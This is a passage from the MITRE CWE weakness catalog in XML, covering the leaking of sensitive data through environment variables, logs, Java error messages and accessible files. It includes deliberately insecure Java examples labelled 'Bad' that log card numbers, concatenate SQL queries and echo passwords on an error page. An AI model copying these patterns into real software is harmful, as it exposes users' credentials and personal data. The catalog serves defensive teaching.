               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Description, Name, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2011-03-29">Information Leak Through Browser Caching</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Information Exposure Through Browser Caching</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="526" Name="Cleartext Storage of Sensitive Information in an Environment Variable" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product uses an environment variable to store unencrypted sensitive information.</Description>
         <Extended_Description>Information stored in an environment variable can be accessible by other processes with the execution context, including child processes that dependencies are executed in, or serverless functions in cloud environments. An environment variable's contents can also be inserted into messages, headers, log files, or other outputs. Often these other dependencies have no need to use the environment variable in question. A weakness that discloses environment variables could expose this information.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="312" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="214" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Encrypt information stored in the environment variable to protect it from being exposed to an unauthorized user. If encryption is not feasible or is considered too expensive for the business use of the application, then consider using a properly protected configuration file instead of an environment variable. It should be understood that unencrypted information in a config file is also not guaranteed to be protected, but it is still a better choice, because it reduces attack surface related to weaknesses such as CWE-214. In some settings, vaults might be a feasible option for safer data transfer. Users should be notified of the business choice made to not protect the sensitive information through encryption.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If the environment variable is not necessary for the desired behavior, then remove it entirely, or clear it to an empty value.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-43691</Reference>
               <Description>CMS shows sensitive server-side information from environment variables when run in Debug mode.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-43691</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-27195</Reference>
               <Description>Plugin for an automation server inserts environment variable contents into build XML files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-27195</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-25264</Reference>
               <Description>CI/CD tool logs environment variables related to passwords add Contribution to content history.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-25264</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-1318"/>
            <Reference External_Reference_ID="REF-1319"/>
         </References>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Community</Submission_Name>
                <Submission_Date>2006-07-19</Submission_Date>
				<Submission_Comment>Submitted by members of the CWE community to extend early CWE versions</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Name, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Name, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Name>Drew Buttner</Contribution_Name>
               <Contribution_Organization>MITRE</Contribution_Organization>
               <Contribution_Date>2023-01-11</Contribution_Date>
               <Contribution_Comment>Suggested improvements to name, description, relationships, and mitigations</Contribution_Comment>
            </Contribution>
            <Previous_Entry_Name Date="2011-03-29">Information Leak Through Environmental Variables</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Information Exposure Through Environmental Variables</Previous_Entry_Name>
			<Previous_Entry_Name Date="2023-01-31">Exposure of Sensitive Information Through Environmental Variables</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="532" Name="Insertion of Sensitive Information into Log File" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>Information written to log files can be of a sensitive nature and give valuable guidance to an attacker or expose sensitive user information.</Description>
         <Extended_Description>
            <xhtml:p>While logging all information may be helpful during development stages, it is important that logging levels be set appropriately before a product ships so that sensitive user data and system information are not accidentally exposed to potential attackers.</xhtml:p>
            <xhtml:p>Different log files may be produced and stored for:</xhtml:p>
            <xhtml:ul>
               <xhtml:li>Server log files (e.g. server.log).  This can give information on whatever application left the file. Usually this can give full path names and system information, and sometimes usernames and passwords.</xhtml:li>
               <xhtml:li>log files that are used for debugging</xhtml:li>
            </xhtml:ul>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="538" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="200" View_ID="1003" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>Logging sensitive user data often provides attackers with an additional, less-protected path to acquiring the information.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Description>Consider seriously the sensitivity of the information written into log files. Do not write secrets into the log files.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Distribution</Phase>
               <Description>Remove debug log files before deploying the application into production.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Operation</Phase>
               <Description>Protect log files against unauthorized read/write.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Adjust configurations appropriately when software is transitioned from a debug state to production.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following code snippet, a user's full name and credit card number are written to a log file.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>logger.info("Username: " + usernme + ", CCN: " + ccn);</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-120">
               <Intro_Text>This code stores location information about the current user:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>locationClient = new LocationClient(this, this, this);<xhtml:br/>locationClient.connect();<xhtml:br/>currentUser.setLocation(locationClient.getLastLocation());<xhtml:br/>
                     <xhtml:i>...</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>catch (Exception e) {<xhtml:div style="margin-left:1em;">AlertDialog.Builder builder = new AlertDialog.Builder(this);<xhtml:br/>builder.setMessage("Sorry, this application has experienced an error.");<xhtml:br/>AlertDialog alert = builder.create();<xhtml:br/>alert.show();<xhtml:br/>Log.e("ExampleActivity", "Caught exception: " + e + " While on User:" + User.toString());</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>When the application encounters an exception it will write the user object to the log. Because the user object contains location information, the user's location is also written to the log.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-119">
               <Intro_Text>In the example below, the method getUserBankAccount retrieves a bank account object from a database using the supplied username and account number to query the database. If an SQLException is raised when querying the database, an error message is created and output to a log file.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public BankAccount getUserBankAccount(String username, String accountNumber) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>BankAccount userAccount = null;<xhtml:br/>String query = null;<xhtml:br/>try {<xhtml:div style="margin-left:1em;">if (isAuthorizedUser(username)) {<xhtml:div style="margin-left:1em;">query = "SELECT * FROM accounts WHERE owner = "<xhtml:br/>+ username + " AND accountID = " + accountNumber;<xhtml:br/>DatabaseManager dbManager = new DatabaseManager();<xhtml:br/>Connection conn = dbManager.getConnection();<xhtml:br/>Statement stmt = conn.createStatement();<xhtml:br/>ResultSet queryResult = stmt.executeQuery(query);<xhtml:br/>userAccount = (BankAccount)queryResult.getObject(accountNumber);</xhtml:div>}</xhtml:div>} catch (SQLException ex) {<xhtml:div style="margin-left:1em;">String logMessage = "Unable to retrieve account information from database,\nquery: " + query;<xhtml:br/>Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);</xhtml:div>}<xhtml:br/>return userAccount;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The error message that is created includes information about the database query that may contain sensitive information about the database or query logic. In this case, the error message will expose the table name and column names used in the database. This data could be used to simplify other attacks, such as SQL injection (CWE-89) to directly access the database.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2017-9615</Reference>
               <Description>verbose logging stores admin credentials in a world-readablelog file</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-9615</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2018-1999036</Reference>
               <Description>SSH password for private key stored in build log</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2018-1999036</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>FIO13-J</Entry_ID>
               <Entry_Name>Do not log sensitive information outside a trust boundary</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP23</Entry_ID>
               <Entry_Name>Exposed Data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="215"/>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Likelihood_of_Exploit, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Name, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Name, Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Contribution Type="Content">
               <Contribution_Organization>Fortify Software</Contribution_Organization>
               <Contribution_Date>2009-07-15</Contribution_Date>
               <Contribution_Comment>Portions of Mitigations, Consequences and Description derived from content submitted by Fortify Software.</Contribution_Comment>
            </Contribution>
            <Previous_Entry_Name Date="2011-03-29">Information Leak Through Log Files</Previous_Entry_Name>
			<Previous_Entry_Name Date="2019-06-20">Information Exposure Through Log Files</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Inclusion of Sensitive Information in Log Files</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="537" Name="Java Runtime Error Message Containing Sensitive Information" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>In many cases, an attacker can leverage the conditions that cause unhandled exception errors in order to gain unauthorized access to the system.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="211" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="Java" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Do not expose sensitive error information to the user.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In the following Java example the class InputFileRead enables an input file to be read using a FileReader object. In the constructor of this class a default input file path is set to some directory on the local file system and the method setInputFile must be called to set the name of the input file to be read in the default directory. The method readInputFile will create the FileReader object and will read the contents of the file. If the method setInputFile is not called prior to calling the method readInputFile then the File object will remain null when initializing the FileReader object. A Java RuntimeException will be raised, and an error message will be output to the user.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public class InputFileRead {<xhtml:br/>
                     <xhtml:div style="margin-left:1em;">
                        <xhtml:div>private File readFile = null;<xhtml:br/>private FileReader reader = null;<xhtml:br/>private String inputFilePath = null;<xhtml:br/>private final String DEFAULT_FILE_PATH = "c:\\somedirectory\\";<xhtml:br/>
                           <xhtml:br/>public InputFileRead() {<xhtml:div style="margin-left:1em;">inputFilePath = DEFAULT_FILE_PATH;</xhtml:div>}<xhtml:br/>
                           <xhtml:br/>public void setInputFile(String inputFile) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 <xhtml:br/>
                                 <xhtml:i>/* Assume appropriate validation / encoding is used and privileges / permissions are preserved */</xhtml:i>
                                 <xhtml:br/>
                              </xhtml:div>
                           </xhtml:div>}<xhtml:br/>
                           <xhtml:br/>public void readInputFile() {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>try {<xhtml:div style="margin-left:1em;">reader = new FileReader(readFile);<xhtml:br/>...</xhtml:div>} catch (RuntimeException rex) {<xhtml:div style="margin-left:1em;">System.err.println("Error: Cannot open input file in the directory " + inputFilePath);<xhtml:br/>System.err.println("Input file has not been set, call setInputFile method before calling readInputFile");</xhtml:div>
                                 <xhtml:br/>
                                 <xhtml:br/>} catch (FileNotFoundException ex) {...}<xhtml:br/>
                              </xhtml:div>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, the error message output to the user contains information regarding the default directory on the local file system. This information can be exploited and may lead to unauthorized access or use of the system. Any Java RuntimeExceptions that are handled should not expose sensitive information to the user.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In the example below, the BankManagerLoginServlet servlet class will process a login request to determine if a user is authorized to use the BankManager Web service. The doPost method will retrieve the username and password from the servlet request and will determine if the user is authorized. If the user is authorized the servlet will go to the successful login page. Otherwise, the servlet will raise a FailedLoginException and output the failed login message to the error page of the service.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public class BankManagerLoginServlet extends HttpServlet {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>try {<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:i>// Get username and password from login page request</xhtml:i>
                                       <xhtml:br/>String username = request.getParameter("username");<xhtml:br/>String password = request.getParameter("password");<xhtml:br/>
                                       <xhtml:i>// Authenticate user</xhtml:i>
                                       <xhtml:br/>BankManager bankMgr = new BankManager();<xhtml:br/>boolean isAuthentic = bankMgr.authenticateUser(username, password);<xhtml:br/>
                                       <xhtml:i>// If user is authenticated then go to successful login page</xhtml:i>
                                       <xhtml:br/>if (isAuthentic) {<xhtml:div style="margin-left:1em;">request.setAttribute("login", new String("Login Successful."));<xhtml:br/>getServletContext().getRequestDispatcher("/BankManagerServiceLoggedIn.jsp"). forward(request, response);</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">
                                          <xhtml:div>
                                             <xhtml:br/>
                                             <xhtml:i>// Otherwise, raise failed login exception and output unsuccessful login message to error page</xhtml:i>
                                             <xhtml:br/>throw new FailedLoginException("Failed Login for user " + username + " with password " + password);</xhtml:div>
                                       </xhtml:div>}</xhtml:div>
                                 </xhtml:div>} catch (FailedLoginException ex) {<xhtml:div style="margin-left:1em;">
                                    <xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:i>// output failed login message to error page</xhtml:i>
                                       <xhtml:br/>request.setAttribute("error", new String("Login Error"));<xhtml:br/>request.setAttribute("message", ex.getMessage());<xhtml:br/>getServletContext().getRequestDispatcher("/ErrorPage.jsp").forward(request, response);</xhtml:div>
                                 </xhtml:div>}</xhtml:div>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>However, the output message generated by the FailedLoginException includes the user-supplied password. Even if the password is erroneous, it is probably close to the correct password. Since it is printed to the user's page, anybody who can see the screen display will be able to see the password. Also, if the page is cached, the password might be written to disk.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Content_History>
            <Submission>
               <Submission_Name>Anonymous Tool Vendor (under NDA)</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Name, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2011-03-29">Information Leak Through Java Runtime Error Message</Previous_Entry_Name>
			<Previous_Entry_Name Date="2020-02-24">Information Exposure Through Java Runtime Error Message</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="538" Name="Insertion of Sensitive Information into Externally-Accessible File or Directory" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product places sensitive information into files or directories that are accessible to actors who are allowed to have access to the files, but not to the sensitive information.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="200" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Phase>System Configuration</Phase>
               <Description>Do not expose file and directory information to the user.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="95"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 12: Information Leakage.&#34; Page 191"/>
         </References>
         <Notes>
            <Note Type="Maintenance">Depending on usage, this could be a weakness or a category. Further study of all its children is needed, and the entire sub-tree may need to be clarified. The current organization is based primarily on the exposure of sensitive information as a consequence, instead of as a primary weakness.</Note>
            <Note Type="Maintenance">There is a close relationship with CWE-552, which is more focused on weaknesses. As a result, it may be more appropriate to convert CWE-538 to a category.</Note>
         </Notes>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Community</Submission_Name>
                <Submission_Date>2006-07-19</Submission_Date>
				<Submission_Comment>Submitted by members of the CWE community to extend early CWE versions</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
